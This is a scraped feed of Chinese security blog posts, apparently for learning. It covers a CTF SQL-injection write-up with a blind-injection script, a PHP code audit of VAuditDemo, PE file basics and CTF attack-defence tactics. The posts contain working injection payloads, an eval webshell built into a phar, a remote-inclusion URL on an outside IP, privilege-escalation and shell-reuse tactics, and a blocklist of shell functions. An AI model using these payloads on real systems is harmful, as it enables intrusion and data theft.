//本地和远程仓库的文件内容都回到了上一个版本//如果此时你后悔了，还想回到最新的版本中$git reflog //61e013c HEAD@&#123;7&#125;: commit: 增加相似md5值，匹配内容$git reset --hard 61e013c$git push -f -u master master//同想能达到后悔的目的","categories":[{"name":"git","slug":"git","permalink":"https://www.xjseck.com/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://www.xjseck.com/tags/git/"},{"name":"仓库","slug":"仓库","permalink":"https://www.xjseck.com/tags/仓库/"}]},{"title":"一道有意思的注入题","slug":"一道有意思的注入题","date":"2017-10-15T16:10:34.000Z","updated":"2018-07-15T16:14:28.971Z","comments":true,"path":"2017/10/16/一道有意思的注入题/","link":"","permalink":"https://www.xjseck.com/2017/10/16/一道有意思的注入题/","excerpt":"","text":"前言“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现 分析过程先直接上代码123456789101112131415161718192021222324252627282930313233343536$db=&quot;db&quot;;$db_name=&quot;###&quot;;$db_pw=&quot;###&quot;;$host=&quot;localhost&quot;;$conn=mysqli_connect($host,$db_name,$db_pw,$db);if(!$conn)&#123; die(mysqli_errno());&#125;foreach($_GET as $get)&#123; if(is_array($get))&#123; foreach($get as $g)&#123; if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;union&apos;)!=FALSE)&#123; die(&apos;stop attack!&apos;); &#125;else if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;from&apos;)!=FALSE)&#123; die(&apos;no attack!&apos;); &#125; &#125; &#125;else&#123; if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123; die(&apos;stop attack!&apos;); &#125; &#125;&#125;$id=$_GET[&apos;id&apos;];if(is_array($id))&#123; $sql=&apos;select * from user where id in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;; echo &quot;2=&gt;&quot;;&#125;else&#123; $sql=&apos;select * from user where id =&apos;.$id; echo &quot;1=&gt;&quot;;&#125;$result=mysqli_query($conn,$sql);while($row=mysqli_fetch_array($result))&#123; printf(&quot;id: %s&lt;br&gt; Title: %s&lt;br&gt; %s&quot;,$row[0],$row[1],$row[2]);&#125;mysqli_free_result($result); 这里有几个trick要注意 首先分析一下流程开始判断传入的id是否是数组如果是就需要过foreach 的if里(stristr函数)的判断否则也要经过if里的判断 bypass点stristr函数不区分大小写 返回从搜索的字符串开始，没有搜索到就返回FALSE。如果$get(id的值)不是数组就直接进入 123if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123; die(&apos;stop attack!&apos;); &#125; 也就是不能同时存在select 和 union字符，这一点我们可以使用时间的盲注进行,直接传入12$sql=&apos;select * from user where id =&apos;.$id;//payload select * from user where id =1 and(select(sleep(3))) 简单的写一个bool的盲注脚本,也可以使用sqlmap跑一下123456789101112131415161718192021222324252627#coding:utf-8import requestsimport stringstr=string.ascii_lettersstr=str+&apos;,&apos;print strurl=&quot;http://127.0.0.1/&quot;debug = 0 #当没有数据出现就中断注入database =&apos;student&apos;table=&apos;&apos;for i in range(1,16): test=debug for x in str: #payload =&quot;?id=1 and(ascii(substr(database(),%s,1))=%s)&quot; %(i,ord(x)) payload=&apos;?id=1 and(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73747564656E74),%s,1))=%s)&apos; %(i,ord(x)) u_p=url+payload res=requests.get(u_p) # print u_p if &quot;admin&quot; in res.content: table=table+x print &quot;table:&quot;,table debug=debug+1 break if debug==test: break else: continue 如果判断的再死一点，把union关键字换成from，也就是不能同时出现 select 和union了，没有办法遍历出数据库和表了，只能爆破表名和字段了。else走不通了，那我们按照正常的if来走一遍，首先我们知道可以通过url传数组也就是我们利用传数组这样的方式bypass，最终执行的sql语句就是1$sql=&apos;select * from user where id in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;; 只要能绕过if中的stristr函数的检测就能拼接到sql语句中另一个trick 就是我们传入数组的时候可以这样传入id[]=1&amp;id=2去绕过stristr,也可以拼接到sql语句中按照这样的一个思路12345首先拼接 ) id[]=1)然后是stristr函数id[]= union/* &amp;id[]= */select 1,database(),3 #//$_GET[id]=$id[]= &#123; [0] =&gt; -1) union/* [1] =&gt; */ select 1,user(),3# &#125;//最终的sql=select * from user where id in(-1) union/*,*/select 1,user(),3# 成功使用布尔型的注入。 总结trick点 url 传数组分段传入输入绕过stristr函数的检测","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.xjseck.com/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"}]},{"title":"VAuditDemo代码审计","slug":"VAuditDemo代码审计","date":"2017-09-28T11:06:44.000Z","updated":"2018-06-15T13:48:16.664Z","comments":true,"path":"2017/09/28/VAuditDemo代码审计/","link":"","permalink":"https://www.xjseck.com/2017/09/28/VAuditDemo代码审计/","excerpt":"","text":"前言主要参考Virink师傅的视屏带入门PHP代码审计视频地址系统的主要编写流程比较好分析，PHP嵌套HTML开发。 审计浏览大致的浏览一下系统的文件目录和配置文件说明什么的，这里的系统文件还是比较少一些，主要是浏览一下入口文件(index.php)、配置文件(config.php)、安装文件(install.php)、以及lib.php文件通过这些文件我们能大致的知道系统的一些基本配置和全局设置。我们主要关注一下lib.php文件，只要是加载了lib.php文件首先就设置了 全局变量的防护($_GET、$_POST、$COOKIE)都会自动加载addslashes函数‘ “ null \\ 返回 \\’ \\” \\\\ 代码如下123456789101112131415161718if( !get_magic_quotes_gpc() ) &#123; $_GET = sec ( $_GET ); $_POST = sec ( $_POST ); $_COOKIE = sec ( $_COOKIE ); &#125;$_SERVER = sec ( $_SERVER );function sec( &amp;$array ) &#123; if ( is_array( $array ) ) &#123; foreach ( $array as $k =&gt; $v ) &#123; $array [$k] = sec ( $v ); &#125; &#125; else if ( is_string( $array ) ) &#123; $array = addslashes( $array ); &#125; else if ( is_numeric( $array ) ) &#123; $array = intval( $array ); &#125; return $array;&#125; 然后注意后面自定义的一些安全函数是否能bypass 123456789101112131415161718192021222324function sqlwaf( $str ) &#123; $str = str_ireplace( &quot;and&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;or&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;from&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;execute&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;update&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;count&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;chr&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;mid&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;char&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;union&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;select&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;delete&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;insert&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;limit&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;concat&quot;, &quot;sqlwaf&quot;, $str ); $str = str_ireplace( &quot;\\\\&quot;, &quot;\\\\\\\\&quot;, $str ); $str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;&apos;&quot;, &quot;&quot;, $str ); $str = str_ireplace( &quot;%&quot;, &quot;\\%&quot;, $str ); $str = str_ireplace( &quot;_&quot;, &quot;\\_&quot;, $str ); return $str;&#125; 粗略的看一下后面几段出现替换为空的操作，单引号被替换为空，数字型的注入就可以，可能就会出现问题比如$sql=”select * from user where $id”;就直接bypass payload 如 an||d(sele||ct(sleep(3))) 安装问题install.php 文件开头代码如下1234if (file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &apos;/sys/install.lock&apos;)) &#123; header(&quot;Location: ../index.php&quot;);&#125;...... 这里只是判断了install.lock 文件的存在，正常应该是存在这个文件之后就直接退出后面的操作，没有的话，后面的代码块还会继续执行，所以后面如果出现了可控的参数，一样会带入进行执行操作。问题：可控参数如下：1234$dbhost = $_POST[&quot;dbhost&quot;];$dbuser = $_POST[&quot;dbuser&quot;];$dbpass = $_POST[&quot;dbpass&quot;];$dbname = $_POST[&quot;dbname&quot;]; 前三个是连接数据库的信息没有办法进行写入，$dbname = $_POST[“dbname”];到变量$str_tmp中去”\\$database=\\”$dbname\\”; \\r\\n”;只要保证查询语句不出现错误mysql_query(“CREATE DATABASE $dbname”, $con) or die(mysql_error());创建一个不存在的数据库名就能成功写入config.php文件到目录拼接到sql语句中 “CREATE DATABASE $dbname”, $con payload如下：dbname=test -- -“;phpinfo();”最后的内容写到/sys/config.php中的内容为$database=&quot;test -- -&quot;;phpinfo();”&quot;;造成任意的代码写入漏洞。 文件包含读到index.php文件module参数可控如果开启远程包含 pyload如下123456if (isset($_GET[&apos;module&apos;])) &#123; include $_GET[&apos;module&apos;] . &apos;.inc&apos;; //php.ini 配置开启allow_url_include = On //这里存在远程文件包含module=http://39.108.59.30/1.txt? 1.txt的内容 &lt;?php phpinfo();&#125; 如果是本地文件包含的话，可以利用上传的图片进行包含获得shell比如图片上传的文件代码如下1234User/ updateAvatar.php$avatar = $uploaddir . ‘/u‘. time(). ‘‘ . $_FILES[‘upfile’][‘name’];if (move_uploaded_file($_FILES[‘upfile’][‘tmp_name’], $avatar)) &#123;&#125; 可以上传图片文件 需要爆破一下文件地址然后使用phar协议包含文件首先需要生成phar包文件需要把php.ini phar.readonly 设置成Off然后直接浏览器访问此脚本生成一个my.phar包文件如果包含文件的后缀是.php 或者inc需要改一下脚本的shell的后缀12345678910111213141516&lt;?phptry&#123; $p = new Phar(&quot;my.phar&quot;, 0, &apos;my.phar&apos;);&#125; catch (UnexpectedValueException $e) &#123; die(&apos;Could not open my.phar&apos;);&#125; catch (BadMethodCallException $e) &#123; echo &apos;technically, this cannot happen&apos;;&#125;$p-&gt;startBuffering();$p[&apos;shell.inc&apos;] = &apos;&lt;?php phpinfo(); eval($_POST[x]); ?&gt;&apos;;// make a file named my.phar$p-&gt;setStub(&quot;&lt;?php Phar::mapPhar(&apos;myphar.phar&apos;);__HALT_COMPILER();&quot;);$p-&gt;stopBuffering();?&gt; 最后的payload如下：/index.php?module=phar://uploads/my.gif/shellpost x=phpinfo();类似的伪协议还有zip 注入漏洞文件search.php没有包含lib.php 就直接参数入sql语句，进行全局的过滤，导致注入成功。12345if (!empty($_GET[&apos;search&apos;])) &#123; $query = &quot;SELECT * FROM comment WHERE comment_text LIKE &apos;%&#123;$_GET[&apos;search&apos;]&#125;%&apos;&quot;; //未过滤存在sql注入 $data = mysql_query($query, $conn); ?&gt; 由于包含了config.php error_reporting(0); 只能盲注由于表comment 没有数据使用sleep 貌似没有反应这里使用?search=%’+or if(1,benchmark(50000000,SHA1(1)),1);– -如果查询语句中没有返回值的话使用sleep函数是没有反应的 越权操作没有判断id是否是当前操作的用户。手工检测一般都都是修改id，是否能影响到不同用户的属性。如果是看代码一般是sql语句什么的 看不出来是存在sql注入但是如果对用户的id没有进行判读就会出现越权的操作。可控点$clean_user_id = clean_input($_POST[&#39;id&#39;]);然后紧接着就带入sql语句中$query = “SELECT * FROM users WHERE user_name = ‘$clean_username’”;造成任意用户名被修改 二次注入一般出现的问题是第一次入库被过滤了，但是在出库的时候没有过滤，直接带入到sql语句中。一般是update 或者insert 语句出现问题。问题就出在messageSub.php文件$query = &quot;INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())&quot;;可以看到$_SESSION[‘username’] 被带入sql语句中，我们搜索一下$_SESSION[‘username’] 在哪被赋值User/logCheck.php处出现赋值$_SESSION[‘username’] = $row[‘user_name’];可以发现前面是判断用户登录$query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;可以让形如seck\\的用户成功登录返回的结果带入$_SESSION[‘username’] = $row[‘user_name’];进行赋值。此时$_SESSION[&#39;username&#39;]就等于seck\\所以只要$_SESSION[&#39;username&#39;] 带入了sql语句中就会转义引号，就造成了二次注入。漏洞流程分析如下：sys/lib.php首先加载此文件123456789101112131415161718192021222324252627282930if (!get_magic_quotes_gpc()) &#123; $_GET = sec($_GET); $_POST = sec($_POST); $_COOKIE = sec($_COOKIE);&#125;$_SERVER = sec($_SERVER);function sec(&amp;$array)&#123; if (is_array($array)) &#123; foreach ($array as $k =&gt; $v) &#123; $array[$k] = sec($v); &#125; &#125; else if (is_string($array)) &#123; $array = addslashes($array); &#125; else if (is_numeric($array)) &#123; $array = intval($array); &#125; return $array;&#125;会有一个全局的防注入Addslashes自动会转义 现在我们看一下注册用户的sql语句User/regCheck.php大致看了一下代码注册成功就直接赋值$_SESSION[&apos;username&apos;]，相当于完成了登录。$clean_name = clean_input($_POST[&apos;user&apos;]);看一下clean_input函数function clean_input($dirty)&#123; return mysql_real_escape_string(stripslashes($dirty));&#125; 所以我们只要注册一个形如seck\\末尾是斜杠的用户，存储在数据库的用户名称的数据也是seck\\注册seck\\用户后，$_SESSION[&#39;username&#39;] 的赋值实在regCheck.php文件中进行赋值的，被clean_input函数给过滤了，我们需要重新登录一下，$_SESSION[&#39;username&#39;] 的值才是seck\\,之后转到留言处，进行sql语句的拼接造成二次注入，查看一下messageSub.php的sql语句如下：INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())payload如下：updatexml(1,concat(0x7e,database(),0x7e),1),2)#’INSERT INTO comment(user_name,comment_text,pub_date) VALUES (‘seck\\’,’,updatexml(1,concat(0x7e,database(),0x7e),1),2)#’,now!(sql)[erci.png] 逻辑漏洞后台登录使用验证码进行防止爆破密码，一般我们找逻辑漏洞的点一般是验证码、密码找回、参数值等这里就会发现我们登录一个用户，判断验证码时，没有更新，也就是我们每一次登录，填写一次验证码就可以测试多个密码值，验证码没有失效。主要代码 123456if (isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_POST[&apos;user&apos;]) &amp;&amp; !empty($_POST[&apos;pass&apos;])) &#123; include_once(&apos;../header.php&apos;); if(@$_POST[&apos;captcha&apos;] !== $_SESSION[&apos;captcha&apos;])&#123; header(&apos;Location: login.php&apos;); exit; &#125; 这里的问题，在exit之前给$_SESSION[&#39;captcha&#39;] 重新赋新值。 总结实际上线的系统一般都是基于框架开发，MVC设计思想的框架设计，一定程度上此测试系统在阅读和审计上面都是一些自行设计的一些问题，到实际项目业务中还是有一定的偏差，但是可以很好的练习PHP代码上的安全编写问题。后续的原创技术文章持续更新。 （大象安全,注重人才培养和技术分享，感谢关注！）","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://www.xjseck.com/tags/代码审计/"}]},{"title":"从PHP基础到代码审计","slug":"从PHP基础到代码审计","date":"2017-09-11T10:55:25.000Z","updated":"2018-06-15T11:02:48.964Z","comments":true,"path":"2017/09/11/从PHP基础到代码审计/","link":"","permalink":"https://www.xjseck.com/2017/09/11/从PHP基础到代码审计/","excerpt":"","text":"从入坑CTF-web开始一开始是观摩wooyun开始的，从那时开始感觉自己在学习的路上就停不下来了，也是作为“脚本小子”开始，感觉浮躁的不行，再到入坑CTF，认识了更多的人，从被虐开始，也是能让自己停下来，怎么构建自己的技能树，又怎么静下心来积淀，所以决定从头系统的学习PHP到代码审计，看看自己能做多远，少花一点时间划水了。 PHP基础记得最清楚的事情是使用工具爆破网站目录，发现类似url：ip/item/index/或者类似ip/index.php/Controller/index 发现扫描的文件却没有几个，后来发现是MVC的设计系统。这里就打算从撸PHP项目，实现一些简单的项目入手学习，就由浅入深慢慢学习吧，主要参考 高洛峰的《细说PHP》WooYunPages《深入PHP面向对象 模式与实践》 后面的内容会详细介绍PHP基础的一些学习 代码审计主要可以从几方面进行学习总结。 CTF题目 乌云案例 漏洞演示系统 (DVWA SQLI ….) 开源系统 审计案例 漏洞总结 安装问题 包含漏洞 找回密码 文件上传 文件操作 加密函数 Xss SQLinject CSRF SSRf 命令执行 越权 变量覆盖 Xpath 注入 模板注入 危险函数 信息泄露 PHP版本特性 写到最后整个过程持续的时间会比较久，希望自己能够坚持下去，也希望能帮助到有此研究学习意向的 朋友。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/categories/PHP/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"}]},{"title":"Mini_Project_RCE_理论篇(1)","slug":"Mini-Project-RCE-理论篇-1","date":"2017-09-09T14:01:27.000Z","updated":"2018-06-11T07:22:23.384Z","comments":true,"path":"2017/09/09/Mini-Project-RCE-理论篇-1/","link":"","permalink":"https://www.xjseck.com/2017/09/09/Mini-Project-RCE-理论篇-1/","excerpt":"","text":"作者: tangKID 1.PE结构介绍：PE结构是Windows平台上可执行文件所必须遵循的格式，通俗的说就是后缀为.exe的文件，后期大家在Windows下碰到的各种加壳和脱壳工具的使用和编写过程都离不开PE结构。 1.1PE节区(Section):.text这个节区存放着程序的代码段的内容。.data这个节区存放着程序的数据段的内容。.idata存放着从终端输入到程序的内容。.rsrc这个节区通常存放着一些模块的资源信息，这个模块通常使用较少.当然在NT中定义了有九种预设定的section的内容，这里介绍的只是比较常见和常用的区段。 1.2PE的历史残留问题:接触DOS的人看到这里应该就不会觉得陌生了，这里介绍的就是DOS头和DOS存根.PE文件的第一个字节起始于MS-DOS头部，被称作IMAGE_DOS_HEADER(这个结构的具体内容大家上网查询就可以). 1.3PE头(又名NT头):PE头表示为结构体IMAGE_NT_HEADERS其中IMAGE_NT_HEADERS中包含着另外两个结构体:1.IMAGE_FILE_HEADER 包含一些底层的硬件信息，不是特别常用。2.IMAGE_OPTIONAL_HEADER32 这个结构体是PE中最大的结构体，也是包含了RE中我们比较重要的信息。 其中比较重要的几项:1、入口点 Entry Point2、文件偏移地址 File Offset3、虚拟地址 Virtual Address 简称:VA4、基地址 ImageBase5、相对虚拟地址 Relative Virual Address 简称:RVARVA (相对虚拟地址) =VA (虚拟地址) － ImageBase (基地址)左边是存放在磁盘中，右边是加载到内存中 1.4PE结构在实践中的情况:对一个可执行文件进行PE结构的查看 1.4.1简单的Hello Word图1.4.1 程序源码 图1.4.2二进制打开 1.4.2二进制分析:(1)看到最开始的”4D 5A”，ASCII码翻译过来就是”MZ”,也就是前面提到的DOS头,从0000000h~00000040h都是DOS头。(2)DOS存根就是从00000040h开始直到”PE”之前都是DOS存根。(3)从”50 45”(“PE”)开始就是PE头(4)从PE头之后往下就是各个节区头，每个节区的起始都是”2E”(5)各个节区头之后就是各个节区的二进制表示。 1.5 PE工具的介绍和使用:1.5.1工具PEiD: 1.5.2装载我们前面的Hello World程序: 请注意，PEiD能够分析的C++程序一般在VS2013之后都会显示C++8.0。 1.5.3节查看器二进制表示中的入口点 1.5.4 PE细节","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"RE","slug":"RE","permalink":"https://www.xjseck.com/tags/RE/"}]},{"title":"CTF-Web解题思路","slug":"CTF-Web解题思路","date":"2017-09-09T07:10:35.000Z","updated":"2018-07-15T04:39:23.118Z","comments":true,"path":"2017/09/09/CTF-Web解题思路/","link":"","permalink":"https://www.xjseck.com/2017/09/09/CTF-Web解题思路/","excerpt":"","text":"简要描述入门安全的方式个人感觉还是从CTF来入手，详细的学习路线可以 知乎上搜索，这里不再累述。Web方面还可以从wooyun镜像来学习。自己也入坑了差不多两年了，大致的总结一下解题思路和自己的一些心态体会吧。 体会当时是14年入的大学，大一打游戏度过，偶然的机会是15年大二，偶得一个学长带我参加了一下新大的安全比赛，当时的比赛水的不行，都不算是比赛吧，偶然听到了wooyun这个社区，之后就疯狂的百度浏览wooyun，获取WooYun账号，开始水群，就开始各种搜索怎么入门安全，怎么提升技能，听说了CTF，由于新疆的高校也没有CTF比赛，学校以往也是没有学长搞过，只能从网上获取，后面基本上是见到比赛就参加水群，浏览大佬们的博客，关注time-xctf，也是浮躁的不行，也参过一些线下的CTF比赛，基本上是被血虐，其中的收获也是不少的，至少让自己在安全的路上不再是孤独的人。这里就总结一下自己学到的一些套路，也算是为自己吧，毕竟曾经爱过。 套路考察自己相对擅长WEB方面的一些题目，就总结WEB方面的套路，RE逆向的姿势可以参考tangKID小基友的总结。 基础类使用Burp Suite 抓包基本上就能看到题目的提示和考察的知识点。主要这类题目包括：1.HTTP 头知识（User-Agent、XFF、referer、cookie、藏flag和自定义的一些header包括响应头）2.URL知识 包括传参数、数组、字符、编码。3.修改数据包绕过waf、防护或后缀名等。 汇总引用P牛总结的题目汇总 一、爆破，包括md5、爆破随机数、验证码识别等二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\\0截断、iconv截断、各种协议流四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小五、各种找源码技巧，包括git、svn、xxx.php.swp、www.(zip|tar.gz|rar|7z)、xxx.php.bak、xxx.php~六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% &lt;script language=php&gt;、花式解析漏洞、ffmpeg-avi-m3u-xbin七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱十、社工，包括花式查社工库、微博、QQ签名、whois十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）十五、协议，花式IP伪造 X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包十六、逻辑错误（用户注册、已存在、长度）十七、ssrf python-django-directory 比如直接127.0.0.1/../../etc/passwd 进阶类我们知道了题目的意图，可能是几个点都需要满足或者有好几层再或者是题目的页面功能比较齐全亦或者是有什么黑科技，我们就需要分析、google。先大致分析整个题目的功能和参数，一般的思路是扫描备份文件关注最近爆发的漏洞事件，进行代码分析，这里就包含的知识点就比较多了，考察代码审计的功底了，需要提升代码功底，需要学习PHP基础、MVC设计思想、框架使用，这里的就不展开后面会更新PHP学习到实操的代码审计吧，慢慢积攒吧。 线下的一些总结攻防模式一。沙盒模式2016“丝绸之路”杯网络安全精英赛这个算是自己比较正式的CTF线下的比赛了题型 ：贴近实际的目标网站，隐含着花样的拓扑结构，有4个沙盒，各个沙盒可能有关联。 入手点：一。实际的网站一般会是通用的开源框架，需要掌握流行开源框架的利用的exploit。快速的定位漏洞的位置。一 未果的话，快速扫描目录，是否有信息泄漏，和铭感文件。然后就是定位到后台地址，猜用户名和密码，弱口令是关键。还有待扩思路。 进入后台之后的思路就是先getshell ，getshell 的思路就是后台的上传漏洞，一般是后台的编辑插件，比如fuck edit …绕过这些插件的过滤，再者是数据库备份，数据库命令执行等等。提权: 这里如果是window提权首先如果是IIS+2003使用菜刀+pr 或者就是大马+15051exp来提权。如果有防护，使用组建或者免杀等方法提权。获取flag：搜索flag文件，一般是在管理员的桌面。 最后扩大战果：快速的分析此网站所在的网络环境，是否与其他题有关联，是否还存在内网环境等。信息收集的快速定位与扩大化。 这次比赛的总结：开始2个小时的沙盒模式，沙盒1——192.168.199.101 提示don’tscan，没有任何 的思路。沙盒2——102 是一个java的题很像线上的比赛题，这里不是很懂javaweb的参数问题就是没有后缀名的内部传参 比如102/order 显示信息 102/oreder/17 显示id为是17的信息，这里不熟悉参数的问题。(赛后才知道貌似是s2漏洞)沙盒3——103 是一个家具站点，asp+iis+2003，从后台弱口令admim admin 进入之后就是上传一个图片马，然后数据库备份，getshell 菜刀连接 不能执行cmd，上传一个cmd 执行命令，不是system 权限，使用菜刀+cmd+pr 提权添加用户，3389连接之后搜索flag ，最后主办方的提示：沙盒3有沙盒1的入口信息，到第二天的直接放出了沙盒1的入口点，是一个菜刀，需要你re一下，检测一下这菜刀的行为，怎么执行的。只get一个flag，并没有做更大化的信息收集，和后续的拓扑扫描。（不足点:后台备份getshell不是很熟，提权也出了一些问题） http://mycms7.cn.adminftp.com/ 沙盒3测试环境地址 沙盒4—eshop 一个开源的网店系统3.0版本，follow.php注入漏洞未能触发注入，这里也忘记测试后台是否有弱口令了，经验不足。 攻防模式二：web+pwn 服务器的组合。环境说明 web服务 首先是一个/home/user1/wwwroot目录下有flag文件Web目录权限是777 没有root权限 mysql 也是user1权限Web 先说一下一开始的环境，php+mysql 权限都是 r_x权限 目录在/home/user1/wwwroot/ 一开始web 我们就掉了2次分。首先搜索连接数据库的配置文件，进入数据库，修改后台的默认密码，删除其他必要的用户。然后进入web 目录下，修改目录权限。然后就坐等了一天，竟然web 就再没有掉分，我也很奇怪，人品爆发了。后来听到别人的思路就是一开始，上来，猜出了mysqlroot 的弱口令，udf 提权成功了(不是很清楚)，直接就2000分到手，我很想和师傅们聊聊人生。细节有待实现。正确的思路是：一开始可以先拼一波手速，破解默认的admin密码，直接去后台上传文件，先getshell 再说。实际是是说web至少有5个以上的漏洞，师傅们的思路是，注入到管理员的md5，进后台，上传文件 然后包含getshell。获取权限持续得分。正常的策略是tar 打包web 目录的文件到/tmp 目录下然后 scp 下载下来，审计测试。目录的权限如图Wwwroot 权限是7 子目录文件是 r 权限测试udf提权(赛后问了一下大家都没有root)定制脚本优化一下这里修补漏洞的方式：系统防护Netstat kill 进程自动化脚本暴力删除 敏感文件 首先备份网站目录， 后续的做diff命令比对，是否被写后门shel了没有l 首先我们写一个脚本把我们防护的脚本包含到php文件中进行防护然后可以写一个定时删除shell 文件的脚本，不允许在文件夹中写入文件 一：不知道漏洞首先包含php脚本到web文件中做url 参数获取日志后续在分析二：包含waf.php文件做sql注入xss、srf等漏洞的通用防护(做全局变量的防护)三：审计代码发现已知漏洞，做代码上的修补四：做流量的混淆，防止被人流量重放。五：包含自动删除shell脚本六：总结的思路，首先我们可以抓取别人的流量 然后利用别人留下的密码什么比如丝绸杯 我们当时发现我们的admin 表中被添加了用户我们可以用他这用户登录别人的服务器后台，然后再上传shell 什么的 Web 防护加固实现1.有root、administrator 权限的防护首先环境是phpweb防护，首先直接修改php.ini 修改 设置为安全模式然后直接禁止大小马的函数，disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server然后再开启安全模式pcntl_exec() 可以绕过http://security.ctocio.com.cn/tips/5/7764505_5.shtml全部禁止 2.非root权限的防护http://blog.csdn.net/andy1219111/article/details/9054277打包web目录文件下载保存扫描是否有内置后门常规的修改默认的用户名和密码 首先去查看web目录下链接sql的配置文件，获取数据库的密码，然后登陆数据库修改网站的默认后台密码。是否有file权限 修改web目录下文件的权限，设置600，指定目录的权限设置400等，具体的文件具体设置，或者直接设置upload文件权限为chmod 000 写一个自动删除shell的php脚本，白名单，自动删除目录下多出来的php文件Watch –n 1 rm –rf uploads 每1秒定时删除uploads 文件 加载防护waf safe 等php的脚本，抓取流量或者写脚本动态监控 脚本请参考&lt;攻防脚本中的连接地址&gt; 对特定的漏洞进行代码上的修改补上漏洞。 如果手速慢了被植入了内存马，一种是分析php-fmp进行进行查看，申请重启服务另一种是，内存马判断文件，可以手动添加一个文件，内容可以随意了，只要存在此文件名的文件就可以了7.如果主办方check的不严就直接删服务8.赛后向主办方申请要自己服务的日志，一定要做赛后总结，日志分析动态监控踩点防护 使用server.php 抓取 get,post,request等数据包 Py实施md5 检测目录，是否有新增、改动、减少等文件 手动检测本地测试具体办法：首先，php文件内容头批量先导入抓数据包的php脚本和waf脚本然后实施动态监控这里功能可以预先集成在一个py 脚本中具体方法和脚本在【加固脚本】文件夹中漏洞查找 首先扫描web文件，是否含有主办方隐藏的后门 附脚本：查找后门木马Opensns 这里就印证了主办方留有后门直接可以直接刷flag 再一系列的防护之后，代码审计是否有包含 命令执行漏洞 确认有漏洞上传的shell到uoload文件一般upload文件是777权限 所以我们可以Watch –n 1 rm –rf upload 每隔1秒 删除upload文件 内存马的使用，第三届网络空间大赛中学习到使用内存马+手速的模式，然后使用批量的脚本，感觉很无解 加载防护日志，抓取流量或者从别人的服务上分析shell使用别人的shell进行批量 应对备份查找后门，我们可以上传一个具有上传功能的upload.php,再使用内存马来进行隐藏 高一点的赛事，可能网上难以搜索到现成的exp、poc这时就需要审计代码，一般持续的时间相对比较久。附一下一些通用漏洞列表memcache未授权访问 java反序列(struts2可以细分) jenkis jenkis配置不当心脏出血 nosql未授权 